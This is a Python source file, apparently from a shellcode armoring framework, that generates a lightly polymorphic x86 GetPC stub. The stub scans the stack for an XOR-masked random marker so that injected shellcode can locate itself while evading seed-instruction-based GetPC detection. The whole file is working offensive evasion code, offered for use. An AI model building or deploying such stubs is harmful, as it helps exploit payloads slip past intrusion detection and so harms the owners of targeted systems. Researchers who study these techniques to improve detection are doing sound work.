#!/usr/bin/python

"""
Anti-GetPC detection armor integrating stack scanning
For evasion of seed-based GetPC detection
"""

from struct import unpack, pack

from utils.rand import rand_bytes, rand_word_key_pair
from arch.core import arch_registers, stackpointer_registers, word_keywords, ctr_regs, bit_packs

from assembler.assembler import assembler
from evasion_modules.core.core import evasion_module

class evasion_getpc_stackscan(evasion_module):

    #
    # getPC stub evading seed-instruction based detection
    #
    # [+] Features:
    #       + Lightly polymorphic
    #
    # [-] Limitations:
    #       - This only works when executed from the stack
    #
    # [*] Note:
    #       - Can be prefixed by copy_to_stack routine for eliminating limitation
    #
	def getpc_stub(self, getpc_reg):

		word_size = self.bits / 8

		stackpointer_reg = stackpointer_registers[self.bits]

		word_keyword = word_keywords[self.bits]

		regs = arch_registers(self.arch, self.bits)

		# Counter register is blacklisted
		blacklist = [ctr_regs[self.bits]]

		ptr_reg = regs.random_gp_reg(False, blacklist)

		# no reuse of ptr_reg
		blacklist += [ptr_reg]

		work_reg = regs.random_gp_reg(False, blacklist)

		# Generate random marker and corresponding XOR'ed values (to prevent multiple instances of marker in code)	
		marker, xor_val, res_val = rand_word_key_pair(word_size, self.badchars)

		marker_bytes = ''

		for b in marker:
			marker_bytes += "	.byte 0x{:02x}\n".format(ord(b))

		variables = {'marker': marker_bytes, 'xor_val': unpack(bit_packs[self.bits], xor_val)[0], 'res_val': unpack(bit_packs[self.bits], res_val)[0], 'ptr_reg': ptr_reg, 'work_reg': work_reg, 'word_keyword': word_keyword, 'getpc_reg': getpc_reg, 'stackpointer_reg': stackpointer_reg}

		listing = '''
main:
	JMP skipmarker
marker_offset:
{marker}
skipmarker:
	MOV {ptr_reg}, {stackpointer_reg}
scanloop:
	MOV {work_reg}, {word_keyword} PTR [{ptr_reg}]
	XOR {work_reg}, {xor_val}
	XOR {work_reg}, {res_val}
	TEST {work_reg}, {work_reg}
	JZ donescanning
	INC {ptr_reg}
	JMP scanloop
donescanning:
	LEA {getpc_reg}, {word_keyword} PTR [{ptr_reg} + (end_stub - marker_offset)]
end_stub:
'''

		asm = assembler(self.arch, self.bits)
		stub = asm.assemble(listing.format(**variables))
		return stub
